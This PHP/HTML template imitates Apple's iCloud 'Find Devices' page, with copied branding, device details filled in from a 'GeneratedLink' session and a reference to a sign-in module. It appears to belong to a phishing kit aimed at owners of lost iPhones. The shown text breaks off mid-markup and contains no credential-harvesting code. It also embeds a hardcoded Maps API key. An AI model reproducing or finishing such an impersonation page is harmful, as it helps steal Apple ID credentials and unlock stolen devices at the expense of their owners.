<?php
	include(__DIR__ . "/../includes/apple.php");
	$map_key = $_SESSION['Link']['GeneratedLink']['map_api_key'] ?? 'AIzaSyDhyfPELv4xUfhsnvV4PBW6pBnBYhz5LNE';
	$address = $_SESSION['Link']['GeneratedLink']['manual_location'] ?? 'Seatle, LA';
	$device_model = $_SESSION['Link']['GeneratedLink']['device_model'] ?? 'iPhone';
	$device_img = $_SESSION['Link']['GeneratedLink']['device_img'] ?? 'https://statici.icloud.com/fmipmobile/deviceImages-9.0/iPhone/iPhone15,3/online-infobox__2x.png';
	$module = 'signin.php';
?>

<!DOCTYPE html>
<html lang="en-us" dir="ltr" data-supports-webp="" class="js-focus-visible" data-js-focus-visible="" data-primary-interaction-mode="mouse" data-device-type-class="desktop">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
    <meta name="description" content="Log in to iCloud to access your photos, mail, notes, documents and more. Sign in with your Apple ID or create a new account to start using Apple services.">
    <meta name="keywords" content="icloud, free, apple">
    <meta name="og:title" content="iCloud.com">
    <meta name="og:image" content="https://www.icloud.com/icloud_logo/icloud_logo.png">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">
    <meta name="google" content="notranslate">
    <meta name="theme-color" content="rgb(251, 251, 253)" data-default-color="rgb(251, 251, 253)">
    <link rel="apple-touch-icon" sizes="180x180" href="https://www.icloud.com/system/icloud.com/2404Project58/en-us/apple-touch-icon.png">
    <link rel="apple-touch-icon" sizes="120x120" href="https://www.icloud.com/system/icloud.com/2404Project58/en-us/apple-touch-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="152x152" href="https://www.icloud.com/system/icloud.com/2404Project58/en-us/apple-touch-icon-152x152.png">
    <link rel="apple-touch-icon-precomposed" sizes="180x180" href="https://www.icloud.com/system/icloud.com/2404Project58/en-us/apple-touch-icon-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="120x120" href="https://www.icloud.com/system/icloud.com/2404Project58/en-us/apple-touch-icon-120x120-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="https://www.icloud.com/system/icloud.com/2404Project58/en-us/apple-touch-icon-152x152-precomposed.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://www.icloud.com/system/icloud.com/2404Project58/en-us/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://www.icloud.com/system/icloud.com/2404Project58/en-us/favicon-16x16.png">
    <link rel="mask-icon" sizes="any" color="#898989" href="https://www.icloud.com/system/icloud.com/2404Project58/en-us/safari-pinned-tab.svg">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title> <?=$language['find_devices'][$lang];?> - Apple iCloud </title>
    <base href=".">
  </head>
  <body class="clicking">
    <style>
      /* Always set the map height explicitly to define the size of the div
       * element that contains the map. */
      #map {
        height: 100%;
      }

      /* Optional: Makes the sample page fill the window. */
      html,
      body {
        height: 100%;
        margin: 0;
        padding: 0;
      }

      .gm-style-cc {
        display: none !important;
      }

      img[alt="Google"] {
        content: url("script/icloud2024/img/mapmarks.png") !important;
        left: 13px !important;
        top: -20px !important;
      }

      #fmip-root-view {
        z-index: 2 !important;
      }

      #map {
        z-index: 2 !important;
      }

      .fmip-device-details-pane.compact {
        padding: 17px 21px 6px !important;
      }

      .device-details-pane.compact .close {
        padding: 15px 21px 10px !important;
      }

      @media screen and (max-width: 1024px) {
        #fmip-device-viewer-desktop {
          display: none !important;
        }

        #fmip-device-viewer {
          display: block !important;
        }
      }

      *,
      ::after,
      ::before {
        box-sizing: unset !important;
      }

      img,
      svg {
        vertical-align: unset !important;
      }

      .apple-id-view {
        height: 400px;
      }
    </style>
	
	<link rel="stylesheet" href="script/icloud2024/css/bootstrap.min.css">
	<script src="script/icloud2024/js/bootstrap.min.js"></script>
	<link rel="stylesheet" href="script/icloud2024/css/map_main.css">
	
    <div id="fmip-root-view" data-size-class="regular">
      <header>
        <div class="fmip-toolbar">
          <header class="cloudos-toolbar app">
            <div class="icloud-logo">
              <a href="/" aria-label="Navigate to icloud.com home page">
                <svg width="82" height="31" xmlns="http://www.w3.org/2000/svg" class="apple-icloud-logo dark" aria-hidden="true">
                  <g fill="none" fill-rule="nonzero">
                    <path d="M16.907 16.5h2.55V5.423h-2.55V16.5Zm1.28-12.832c.412 0 .763-.144 1.05-.43a1.41 1.41 0 0 0 .432-1.033c0-.407-.144-.753-.432-1.038a1.445 1.445 0 0 0-1.05-.426c-.407 0-.756.142-1.046.426-.291.285-.437.63-.437 1.038 0 .401.146.745.437 1.032.29.287.64.43 1.046.43v.001Zm9.915 13.156c1.14 0 2.157-.21 3.052-.631.864-.395 1.616-1 2.188-1.758.563-.752.908-1.624 1.037-2.619l.007-.091h-2.594l-.021.076a3.58 3.58 0 0 1-.713 1.465 3.35 3.35 0 0 1-1.258.943c-.5.219-1.065.328-1.695.328-.847 0-1.582-.22-2.204-.663-.623-.442-1.103-1.07-1.441-1.884-.338-.813-.507-1.776-.507-2.886v-.016c0-1.115.17-2.076.507-2.886.338-.81.817-1.434 1.439-1.875.62-.44 1.354-.66 2.199-.66.634 0 1.201.117 1.702.351.501.235.92.565 1.257.99.338.425.572.926.705 1.505l.026.105h2.59l-.004-.093c-.118-1.006-.46-1.895-1.028-2.668a5.886 5.886 0 0 0-2.204-1.819c-.901-.439-1.916-.658-3.044-.658-1.405 0-2.619.311-3.642.935-1.022.624-1.812 1.511-2.368 2.663-.556 1.152-.834 2.523-.834 4.113v.016c0 1.588.278 2.958.834 4.11.555 1.154 1.346 2.043 2.372 2.669 1.026.625 2.24.938 3.642.938Zm8.034-.324h2.55V1.24h-2.55V16.5Zm9.534.222c1.1 0 2.049-.231 2.846-.693.797-.461 1.413-1.122 1.846-1.982.434-.86.65-1.886.65-3.08v-.02c0-1.191-.218-2.216-.655-3.074a4.68 4.68 0 0 0-1.852-1.98c-.798-.46-1.744-.691-2.838-.691-1.086 0-2.03.23-2.829.694a4.69 4.69 0 0 0-1.855 1.981c-.438.859-.656 1.882-.656 3.07v.02c0 1.191.216 2.217.65 3.078.434.86 1.05 1.522 1.85 1.984.8.462 1.747.693 2.843.693Zm.004-2.066c-.572 0-1.063-.146-1.472-.436-.408-.291-.722-.711-.941-1.261-.219-.55-.329-1.213-.329-1.99v-.02c0-.776.11-1.438.33-1.985.22-.548.535-.967.944-1.259.408-.291.896-.437 1.461-.437.571 0 1.06.145 1.469.436.408.29.721.71.941 1.258.22.549.33 1.21.33 1.987v.02c0 .776-.11 1.438-.328 1.988-.218.55-.53.97-.936 1.262-.406.29-.896.437-1.469.437Zm10.596 2.066c.497.008.991-.071 1.46-.233.43-.156.798-.378 1.106-.668.309-.29.557-.639.73-1.026h.13V16.5h2.55V5.423h-2.55v6.444c0 .41-.055.782-.165 1.114a2.33 2.33 0 0 1-.485.853 2.153 2.153 0 0 1-.783.546 2.744 2.744 0 0 1-1.054.191c-.754 0-1.307-.216-1.657-.647-.35-.431-.526-1.063-.526-1.894V5.423h-2.55v7.166c0 .867.144 1.61.433 2.228.289.618.716 1.09 1.281 1.416.566.326 1.259.489 2.08.489Zm12.084-.024c.525 0 1.005-.08 1.441-.24a3.453 3.453 0 0 0 1.955-1.747h.13V16.5h2.55V1.24h-2.55v5.997h-.13a3.292 3.292 0 0 0-.802-1.073c-.338-.3-.727-.53-1.167-.694a4.093 4.093 0 0 0-1.433-.244c-.932 0-1.739.23-2.42.693-.681.463-1.207 1.122-1.579 1.978-.371.855-.557 1.873-.557 3.055v.016c0 1.175.186 2.19.559 3.049.372.858.9 1.52 1.585 1.984.684.464 1.49.697 2.418.697Zm.783-2.15c-.566 0-1.054-.145-1.466-.432-.412-.287-.728-.699-.95-1.235-.22-.536-.33-1.174-.33-1.913v-.016c0-.742.11-1.38.331-1.912.222-.533.539-.944.95-1.232.412-.288.9-.432 1.465-.432.56 0 1.046.146 1.46.436.413.29.735.703.964 1.237.228.534.343 1.169.343 1.906v.016c0 .732-.114 1.366-.34 1.902-.227.536-.548.95-.963 1.24-.415.29-.903.434-1.464.434v.001ZM8.856 3.158C9.35 2.56 9.7 1.745 9.7.92c0-.114-.01-.227-.03-.32-.805.03-1.774.536-2.351 1.217-.454.516-.877 1.341-.877 2.167 0 .123.02.247.031.288.052.01.134.021.217.021.721 0 1.629-.485 2.165-1.135h.001Zm.567 1.31c-1.207 0-2.186.733-2.815.733-.67 0-1.546-.691-2.598-.691C2.02 4.51 0 6.16 0 9.265c0 1.94.742 3.982 1.67 5.303.794 1.114 1.485 2.032 2.485 2.032.99 0 1.422-.66 2.65-.66 1.247 0 1.525.64 2.618.64 1.082 0 1.804-.991 2.484-1.971.763-1.124 1.083-2.218 1.093-2.27-.062-.02-2.134-.866-2.134-3.239 0-2.053 1.629-2.97 1.722-3.043-1.073-1.547-2.712-1.589-3.165-1.589Z" fill="#1D1D1F" transform="translate(2.5 6.5)"></path>
                  </g>
                </svg>
              </a>
            </div>
            <svg aria-label="Find Devices" role="presentation" height="43" class="app-name kern-safe" width="128.2624969482422">
              <text fill="rgb(36, 163, 55)" x="0" y="29" data-testid="app-name"><?=$language['find_devices'][$lang];?></text>
            </svg>
            <div class="action-buttons">
              <ui-button class="push primary icloud-mouse" tabindex="0" ontouchstart="void(0)" role="button" aria-label="1 Alert" aria-haspopup="menu">
                <button type="button" tabindex="-1"></button>
                <svg class="exclamation-mark-circle" viewBox="0 0 99.61 99.657" xmlns="http://www.w3.org/2000/svg" height="20" width="20" aria-hidden="true">
                  <path fill="currentColor" d="M49.805 99.61c27.246 0 49.805-22.608 49.805-49.805C99.61 22.559 77.002 0 49.756 0 22.56 0 0 22.559 0 49.805c0 27.197 22.608 49.804 49.805 49.804Z"></path>
                  <path fill="#fff" d="M49.805 58.887c-2.54 0-3.955-1.416-4.004-4.004l-.635-26.612c-.049-2.587 1.856-4.443 4.59-4.443 2.686 0 4.688 1.904 4.639 4.492l-.684 26.563c-.049 2.636-1.465 4.004-3.906 4.004ZM49.805 75.244c-2.93 0-5.469-2.344-5.469-5.225 0-2.88 2.49-5.273 5.469-5.273 2.978 0 5.469 2.344 5.469 5.273 0 2.93-2.54 5.225-5.47 5.225Z"></path>
                </svg>
              </ui-button>
              <ui-button class="push primary icloud-mouse" tabindex="0" ontouchstart="void(0)" role="button" aria-label="Create" aria-haspopup="menu">
                <button type="button" tabindex="-1"></button>
                <svg class="plus-circle" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64" height="18" width="18" aria-hidden="true">
                  <path d="M29.9475268,59.5867724 C46.1333288,59.5867724 59.534715,46.15661 59.534715,29.9998218 C59.534715,13.8140198 46.1043387,0.412871288 29.9185367,0.412871288 C13.7617248,0.412871288 0.36059406,13.8140198 0.36059406,29.9998218 C0.36059406,46.15661 13.7907743,59.5867724 29.9475268,59.5867724 Z M29.9475268,54.6556041 C16.256299,54.6556041 5.32073466,43.6910496 5.32073466,29.9998218 C5.32073466,16.3085941 16.2273089,5.34403961 29.9185367,5.34403961 C43.6097644,5.34403961 54.5743189,16.3085941 54.6035429,29.9998218 C54.6325367,43.6910496 43.6387545,54.6556041 29.9475268,54.6556041 Z M17.1265367,30.0288119 C17.1265367,31.4501585 18.1417842,32.4073664 19.6211109,32.4073664 L27.4819426,32.4073664 L27.4819426,40.3262377 C27.4819426,41.7765743 28.4682,42.7628318 29.8895466,42.7628318 C31.3398832,42.7628318 32.3551307,41.7765743 32.3551307,40.3262377 L32.3551307,32.4073664 L40.2449525,32.4073664 C41.6952892,32.4073664 42.7105367,31.4501585 42.7105367,30.0288119 C42.7105367,28.5784753 41.6952892,27.5632278 40.2449525,27.5632278 L32.3551307,27.5632278 L32.3551307,19.7023961 C32.3551307,18.1940198 31.3398832,17.2078218 29.8895466,17.2078218 C28.4682,17.2078218 27.4819426,18.2230693 27.4819426,19.7023961 L27.4819426,27.5632278 L19.6211109,27.5632278 C18.1417842,27.5632278 17.1265367,28.5784753 17.1265367,30.0288119 Z" transform="translate(2 2)"></path>
                </svg>
              </ui-button>
              <ui-button class="push primary icloud-mouse" tabindex="0" ontouchstart="void(0)" role="button" aria-label="Quick Access" aria-haspopup="menu">
                <button type="button" tabindex="-1"></button>
                <svg class="square-grid" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64" height="22" width="22" aria-hidden="true">
                  <path d="M2.54982858,9.5141143 L7.18154287,9.5141143 C8.96725716,9.5141143 9.60897144,8.87234287 9.60897144,7.11457144 L9.60897144,2.48285715 C9.60897144,0.697142858 8.96725716,0.0554285715 7.18154287,0.0554285715 L2.54982858,0.0554285715 C0.792000001,0.0554285715 0.150285715,0.697142858 0.150285715,2.48285715 L0.150285715,7.11457144 C0.150285715,8.87234287 0.792000001,9.5141143 2.54982858,9.5141143 Z M19.2350857,9.5141143 L23.8668,9.5141143 C25.6245715,9.5141143 26.2663429,8.87234287 26.2663429,7.11457144 L26.2663429,2.48285715 C26.2663429,0.697142858 25.6245715,0.0554285715 23.8668,0.0554285715 L19.2350857,0.0554285715 C17.4493715,0.0554285715 16.8076572,0.697142858 16.8076572,2.48285715 L16.8076572,7.11457144 C16.8076572,8.87234287 17.4493715,9.5141143 19.2350857,9.5141143 Z M35.8924572,9.5141143 L40.5241715,9.5141143 C42.2819429,9.5141143 42.9237144,8.87234287 42.9237144,7.11457144 L42.9237144,2.48285715 C42.9237144,0.697142858 42.2819429,0.0554285715 40.5241715,0.0554285715 L35.8924572,0.0554285715 C34.1346286,0.0554285715 33.4929143,0.697142858 33.4929143,2.48285715 L33.4929143,7.11457144 C33.4929143,8.87234287 34.1346286,9.5141143 35.8924572,9.5141143 Z M52.5496001,9.5141143 L57.1816001,9.5141143 C58.9673144,9.5141143 59.6090287,8.87234287 59.6090287,7.11457144 L59.6090287,2.48285715 C59.6090287,0.697142858 58.9673144,0.0554285715 57.1816001,0.0554285715 L52.5496001,0.0554285715 C50.7918858,0.0554285715 50.1502858,0.697142858 50.1502858,2.48285715 L50.1502858,7.11457144 C50.1502858,8.87234287 50.7918858,9.5141143 52.5496001,9.5141143 Z M2.68931429,26.1714858 L7.32102858,26.1714858 C9.10674287,26.1714858 9.74845716,25.5297143 9.74845716,23.7719429 L9.74845716,19.1402286 C9.74845716,17.3824 9.10674287,16.7406857 7.32102858,16.7406857 L2.68931429,16.7406857 C0.931542859,16.7406857 0.289771429,17.3824 0.289771429,19.1402286 L0.289771429,23.7719429 C0.289771429,25.5297143 0.931542859,26.1714858 2.68931429,26.1714858 Z M19.3746286,26.1714858 L24.0062858,26.1714858 C25.7641143,26.1714858 26.4058286,25.5297143 26.4058286,23.7719429 L26.4058286,19.1402286 C26.4058286,17.3824 25.7641143,16.7406857 24.0062858,16.7406857 L19.3746286,16.7406857 C17.5889143,16.7406857 16.9471429,17.3824 16.9471429,19.1402286 L16.9471429,23.7719429 C16.9471429,25.5297143 17.5889143,26.1714858 19.3746286,26.1714858 Z M36.0319429,26.1714858 L40.6636572,26.1714858 C42.4214858,26.1714858 43.0632001,25.5297143 43.0632001,23.7719429 L43.0632001,19.1402286 C43.0632001,17.3824 42.4214858,16.7406857 40.6636572,16.7406857 L36.0319429,16.7406857 C34.2741715,16.7406857 33.6324001,17.3824 33.6324001,19.1402286 L33.6324001,23.7719429 C33.6324001,25.5297143 34.2741715,26.1714858 36.0319429,26.1714858 Z M52.7170287,26.1714858 L57.3210287,26.1714858 C59.106743,26.1714858 59.7484572,25.5297143 59.7484572,23.7719429 L59.7484572,19.1402286 C59.7484572,17.3824 59.106743,16.7406857 57.3210287,16.7406857 L52.7170287,16.7406857 C50.9313144,16.7406857 50.2896001,17.3824 50.2896001,19.1402286 L50.2896001,23.7719429 C50.2896001,25.5297143 50.9313144,26.1714858 52.7170287,26.1714858 Z M2.68931429,42.8567372 L7.32102858,42.8567372 C9.10674287,42.8567372 9.74845716,42.2150001 9.74845716,40.4292858 L9.74845716,35.8254858 C9.74845716,34.0397715 9.10674287,33.3980572 7.32102858,33.3980572 L2.68931429,33.3980572 C0.931542859,33.3980572 0.289771429,34.0397715 0.289771429,35.8254858 L0.289771429,40.4292858 C0.289771429,42.2150001 0.931542859,42.8567372 2.68931429,42.8567372 Z M19.3746286,42.8567372 L24.0062858,42.8567372 C25.7641143,42.8567372 26.4058286,42.2150001 26.4058286,40.4292858 L26.4058286,35.8254858 C26.4058286,34.0397715 25.7641143,33.3980572 24.0062858,33.3980572 L19.3746286,33.3980572 C17.5889143,33.3980572 16.9471429,34.0397715 16.9471429,35.8254858 L16.9471429,40.4292858 C16.9471429,42.2150001 17.5889143,42.8567372 19.3746286,42.8567372 Z M36.0319429,42.8567372 L40.6636572,42.8567372 C42.4214858,42.8567372 43.0632001,42.2150001 43.0632001,40.4292858 L43.0632001,35.8254858 C43.0632001,34.0397715 42.4214858,33.3980572 40.6636572,33.3980572 L36.0319429,33.3980572 C34.2741715,33.3980572 33.6324001,34.0397715 33.6324001,35.8254858 L33.6324001,40.4292858 C33.6324001,42.2150001 34.2741715,42.8567372 36.0319429,42.8567372 Z M52.7170287,42.8567372 L57.3210287,42.8567372 C59.106743,42.8567372 59.7484572,42.2150001 59.7484572,40.4292858 L59.7484572,35.8254858 C59.7484572,34.0397715 59.106743,33.3980572 57.3210287,33.3980572 L52.7170287,33.3980572 C50.9313144,33.3980572 50.2896001,34.0397715 50.2896001,35.8254858 L50.2896001,40.4292858 C50.2896001,42.2150001 50.9313144,42.8567372 52.7170287,42.8567372 Z" transform="translate(2 10.571)"></path>
                </svg>
              </ui-button>
              <ui-button class="push primary icloud-mouse" tabindex="0" ontouchstart="void(0)" role="button" aria-label="Account" aria-haspopup="menu">
                <button type="button" tabindex="-1"></button>
                <div class="profile-photo" style="width: 28px; height: 28px;">
                  <ui-image class="standard is-loaded" dir="ltr" style="width: 28px; height: 28px;">
                    <img alt="Your profile photo" src="script/icloud2024/img/profile.jpeg" draggable="false" style="pointer-events: none; transform-origin: left top; transform: scale(0.109375) translate(0px, 0px);">
                  </ui-image>
                </div>
              </ui-button>
            </div>
          </header>
        </div>
      </header>
      <div id="fmip-device-viewer-desktop" class="app-state-loaded regular" style="display:block">
        <section class="device-viewer-section" style="height: 449.2px;z-index: 3;">
          <div aria-hidden="false" class="device-details-pane regular regular ui-card" style="width: 360px; height: 449.2px; left: 0px;">
            <div class="device-details-container">
              <div class="device-details-all-devices">
                <ui-button class="all-devices-button icloud-mouse" tabindex="0" ontouchstart="void(0)" title="Show devices using Find My" role="button">
                  <button type="button" tabindex="-1"></button>
                  <svg width="19" height="21" xmlns="http://www.w3.org/2000/svg" style="overflow: visible; position: relative; left: 4px;">
                    <path d="M 8 10 l -7 6 7 5" stroke="#24a337" fill="none" fill-rule="evenodd" stroke-width="1.5"></path>
                  </svg>
                  <label class="device-details-all-devices-label"><?=$language['all_device'][$lang];?></label>
                </ui-button>
                <div class="device-details-all-devices-button">
                  <ui-button class="push primary collapse-icon icloud-mouse" tabindex="0" ontouchstart="void(0)" title="Hide" role="button">
                    <button type="button" tabindex="-1"></button>
                    <div class="icon-container">
                      <div class="fmip-svg-icon">
                        <svg width="90" height="87" viewBox="0 0 140 120" xmlns="http://www.w3.org/2000/svg" style="margin: 4px 6px 4px 4px;">
                          <g transform="matrix(1 0 0 1 0 75)">
                            <path class="collapse-svg" fill="#21a337" d="M20.752-23.0469L81.8359-23.0469C88.3789-23.0469 92.8223-27.4414 92.8223-33.4473L92.8223-37.793C92.8223-43.75 88.3789-48.1934 81.8359-48.1934L20.752-48.1934C14.2578-48.1934 9.76562-43.75 9.76562-37.793L9.76562-33.4473C9.76562-27.4414 14.2578-23.0469 20.752-23.0469ZM21.7773-29.6387C18.5547-29.6387 16.6992-31.6895 16.6992-34.5215L16.6992-36.6699C16.6992-39.502 18.5547-41.6016 21.7773-41.6016L80.8594-41.6016C84.0332-41.6016 85.8887-39.502 85.8887-36.6699L85.8887-34.5215C85.8887-31.6895 84.0332-29.6387 80.8594-29.6387Z"></path>
                            <path class="collapse-svg" fill="#21a337" d="M51.3184 12.4512C53.1738 12.4512 54.7852 10.8887 54.7852 9.0332L54.7852-2.88086L54.4922-8.83789L56.7383-6.44531L61.9141-1.31836C62.5488-0.634766 63.4277-0.244141 64.2578-0.244141C66.1133-0.244141 67.4316-1.51367 67.4316-3.32031C67.4316-4.29688 67.0898-5.0293 66.4062-5.66406L53.8574-17.1875C52.8809-18.0176 52.1973-18.3594 51.3184-18.3594C50.3906-18.3594 49.707-18.0176 48.7793-17.1875L36.2305-5.66406C35.498-5.0293 35.1562-4.29688 35.1562-3.32031C35.1562-1.51367 36.4746-0.244141 38.3301-0.244141C39.1602-0.244141 40.0391-0.634766 40.7227-1.31836L45.8496-6.44531L48.0957-8.83789L47.8516-2.88086L47.8516 9.0332C47.8516 10.8887 49.4141 12.4512 51.3184 12.4512ZM51.3184-52.832C52.1973-52.832 52.8809-53.1738 53.8574-54.0039L66.4062-65.5762C67.0898-66.1621 67.4316-66.9434 67.4316-67.8711C67.4316-69.6777 66.1133-70.9473 64.2578-70.9473C63.4277-70.9473 62.5488-70.5566 61.9141-69.9219L56.7383-64.7461L54.4922-62.3535L54.7852-68.3594L54.7852-80.2734C54.7852-82.0801 53.1738-83.6426 51.3184-83.6426C49.4141-83.6426 47.8516-82.0801 47.8516-80.2734L47.8516-68.3594L48.0957-62.3535L45.8496-64.7461L40.7227-69.9219C40.0391-70.5566 39.1602-70.9473 38.3301-70.9473C36.4746-70.9473 35.1562-69.6777 35.1562-67.8711C35.1562-66.9434 35.498-66.1621 36.2305-65.5762L48.7793-54.0039C49.707-53.1738 50.3906-52.832 51.3184-52.832Z"></path>
                          </g>
                        </svg>
                      </div>
                    </div>
                  </ui-button>
                </div>
              </div>
              <div>
                <div class="device-details-view">
                  <div class="fmip-device-details-pane regular">
                    <div class="fmip-device-icon image icon" style="height: inherit; width: inherit;">
                      <img alt="iPhone" class="image" src="
																																				<?php echo $device_img?>" style="height: 110px; width: auto;">
                    </div>
                    <div class="title">
                      <div class="name"> <?php echo $device_model?> </div>
                    </div>
                    <div class="fmip-deviceaction-details">
                      <div class="fmip-device-details online collapsed">
                        <div class="container">
                          <div class="details">
                            <div class="subtitle">
                              <span class="status address"></span>
                            </div>
                            <div class="subtitle">
                              <span class="status"><?=$language['now'][$lang];?></span>
                              <div class="fmip-battery-icon">
                                <svg width="28px" height="13px" viewBox="0 0 30 13" version="1.1" xmlns="http://www.w3.org/2000/svg" style="overflow: visible;">
                                  <g id="􀐤--Find-My" stroke="none" stroke-width="1" fill="none" fill-rule="nonzero">
                                    <g>
                                      <path d="M5.20508 13.2129L20.5566 13.2129C22.2266 13.2129 23.6328 13.0566 24.6289 12.0605C25.625 11.0645 25.7715 9.67773 25.7715 8.00781L25.7715 5.20508C25.7715 3.53516 25.625 2.14844 24.6289 1.15234C23.6328 0.15625 22.2266 0 20.5566 0L5.18555 0C3.54492 0 2.13867 0.15625 1.14258 1.15234C0.146484 2.14844 0 3.54492 0 5.17578L0 8.00781C0 9.67773 0.146484 11.0645 1.14258 12.0605C2.13867 13.0566 3.54492 13.2129 5.20508 13.2129ZM4.94141 11.6406C3.93555 11.6406 2.88086 11.5039 2.28516 10.918C1.69922 10.3223 1.57227 9.27734 1.57227 8.27148L1.57227 4.96094C1.57227 3.93555 1.69922 2.89062 2.28516 2.29492C2.88086 1.69922 3.94531 1.57227 4.9707 1.57227L20.8301 1.57227C21.8359 1.57227 22.8906 1.70898 23.4766 2.29492C24.0723 2.89062 24.1992 3.92578 24.1992 4.93164L24.1992 8.27148C24.1992 9.27734 24.0723 10.3223 23.4766 10.918C22.8906 11.5039 21.8359 11.6406 20.8301 11.6406ZM27.0996 9.13086C27.8711 9.08203 28.9062 8.0957 28.9062 6.60156C28.9062 5.11719 27.8711 4.13086 27.0996 4.08203Z" fill="rgb(110, 110, 114)" fill-opacity="0.7"></path>
                                      <rect id="Rectangle" x="2.27027027" y="2.36363636" width="9.03" height="8.27272727" rx="1.125" fill="rgb(110, 110, 114)"></rect>
                                    </g>
                                  </g>
                                </svg>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                      <div class="action-button">
                        <div class="">
                          <div class="fmip-play-sound-control">
                            <ui-button  aria-disabled="false" class="fmip-action-button icon play-sound-button action-button-extra-long-lang icloud-mouse" ontouchstart="void(0)" title="Play a sound on this iPhone" role="button">
                              <button type="button" tabindex="-1"></button>
                              <div class="icon-container">
                                <div class="fmip-svg-icon playing icon1">
                                  <svg width="90" height="90" viewBox="0 0 90 90" xmlns="http://www.w3.org/2000/svg">
                                    <g transform="matrix(1.32, 0, 0, 1.28, -12, 91)">
                                      <path class="play-sound-icon-background" fill="rgb(87,89,206)" d="M44.043 2.00195Q51.7578 2.00195 58.4717-0.878906Q65.1855-3.75977 70.3369-8.91113Q75.4883-14.0625 78.3936-20.7764Q81.2988-27.4902 81.2988-35.2051Q81.2988-42.9199 78.3936-49.6338Q75.4883-56.3477 70.3369-61.499Q65.1855-66.6504 58.4717-69.5312Q51.7578-72.4121 44.043-72.4121Q36.377-72.4121 29.6387-69.5312Q22.9004-66.6504 17.7734-61.499Q12.6465-56.3477 9.74121-49.6338Q6.83594-42.9199 6.83594-35.2051Q6.83594-27.4902 9.74121-20.7764Q12.6465-14.0625 17.7734-8.91113Q22.9004-3.75977 29.6387-0.878906Q36.377 2.00195 44.043 2.00195Z"></path>
                                      <path class="play-sound-svg" fill="#ffffff" d="M43.3105-17.9199Q42.8711-17.9199 42.5049-18.1641Q42.1387-18.4082 41.8457-18.6523L32.3242-27.6855Q31.9336-27.9785 31.4941-27.9785L24.8047-27.9785Q23.5352-27.9785 22.6074-28.9062Q21.6797-29.834 21.6797-31.2012L21.6797-39.2578Q21.6797-40.5273 22.6074-41.4551Q23.5352-42.3828 24.8047-42.3828L31.4941-42.3828Q31.9336-42.3828 32.3242-42.6758L41.8457-51.9531Q42.1387-52.1973 42.5049-52.4414Q42.8711-52.6855 43.3105-52.6855Q43.9453-52.6855 44.2627-52.2461Q44.5801-51.8066 44.5801-51.1719L44.5801-19.4336Q44.5801-18.7988 44.2627-18.3594Q43.9453-17.9199 43.3105-17.9199ZM60.1562-21.3867Q59.8145-21.6309 59.7412-22.0459Q59.668-22.4609 59.9121-22.7539Q61.9141-25.0977 62.915-28.3203Q63.916-31.543 63.916-35.3027Q63.916-41.9922 60.0098-47.8516Q59.7656-48.1934 59.8389-48.584Q59.9121-48.9746 60.1562-49.2676Q60.5957-49.5117 61.0107-49.4385Q61.4258-49.3652 61.7188-48.9746Q63.7695-45.7031 64.8926-42.2852Q66.0156-38.8672 66.0156-35.3027Q66.0156-30.7129 64.8438-27.3193Q63.6719-23.9258 61.6211-21.582Q61.2793-21.2402 60.9131-21.1914Q60.5469-21.1426 60.1562-21.3867ZM52.4414-26.709Q51.7578-27.3438 52.1484-28.0762Q54.4922-31.1035 54.4922-35.3027Q54.4922-39.8438 52.1973-42.4805Q52.002-42.8223 52.0508-43.2129Q52.0996-43.6035 52.4414-43.8965Q52.7832-44.1406 53.1982-44.0918Q53.6133-44.043 53.9062-43.6523Q55.2246-41.9922 55.8838-39.8193Q56.543-37.6465 56.543-35.3027Q56.543-33.0566 55.8838-30.835Q55.2246-28.6133 53.9062-26.9531Q53.6133-26.5625 53.1982-26.5137Q52.7832-26.4648 52.4414-26.709Z"></path>
                                    </g>
                                  </svg>
                                </div>
                              </div>
                              <div class="label playsoundlabel"><?=$language['play_sound'][$lang];?></div>
                            </ui-button>
                          </div>
                        </div>
                        <ui-button  aria-disabled="false" class="fmip-action-button icon lost-button action-button-extra-long-lang icloud-mouse" ontouchstart="void(0)" title="Turn on Lost Mode on this iPhone" role="button">
                          <button type="button" tabindex="-1"></button>
                          <div class="icon-container">
                            <div class="fmip-svg-icon losticon icon1">
                              <svg width="90" height="90" viewBox="0 0 90 90" xmlns="http://www.w3.org/2000/svg">
                                <g transform="matrix(1.23, 0, 0, 1.2, -11, 87)">
                                  <path class="fmip-lock-icon-border" d="M46.2402 4.19922Q54.3457 4.19922 61.4746 1.12305Q68.6035-1.95312 74.0479-7.42188Q79.4922-12.8906 82.5928-20.0195Q85.6934-27.1484 85.6934-35.2051Q85.6934-43.2617 82.5928-50.3906Q79.4922-57.5195 74.0234-62.9883Q68.5547-68.457 61.4258-71.5332Q54.2969-74.6094 46.1914-74.6094Q38.1348-74.6094 31.0059-71.5332Q23.877-68.457 18.457-62.9883Q13.0371-57.5195 9.93652-50.3906Q6.83594-43.2617 6.83594-35.2051Q6.83594-27.1484 9.93652-20.0195Q13.0371-12.8906 18.4814-7.42188Q23.9258-1.95312 31.0547 1.12305Q38.1836 4.19922 46.2402 4.19922Z"></path>
                                  <path class="fmip-lock-icon-svg" d="M31.9824-19.5801L31.9824-35.2051Q31.9824-39.1602 35.2539-39.4531L35.2539-43.8477Q35.2539-49.5117 38.3057-52.9541Q41.3574-56.3965 46.2891-56.3965Q51.1719-56.3965 54.2236-52.9541Q57.2754-49.5117 57.2754-43.8477L57.2754-39.4531Q60.5469-39.1602 60.5469-35.2051L60.5469-19.5801Q60.5469-15.332 56.5918-15.332L35.9375-15.332Q31.9824-15.332 31.9824-19.5801ZM39.8438-39.502L52.6855-39.502L52.6855-44.4336Q52.6855-47.8027 50.9277-49.9023Q49.1699-52.002 46.2891-52.002Q43.4082-52.002 41.626-49.9023Q39.8438-47.8027 39.8438-44.4336Z"></path>
                                </g>
                              </svg>
                            </div>
                          </div>
                          <div class="label lostlabel"><?=$language['mark_lost'][$lang];?></div>
                        </ui-button>
                      </div>
                      <div class="button-stack">
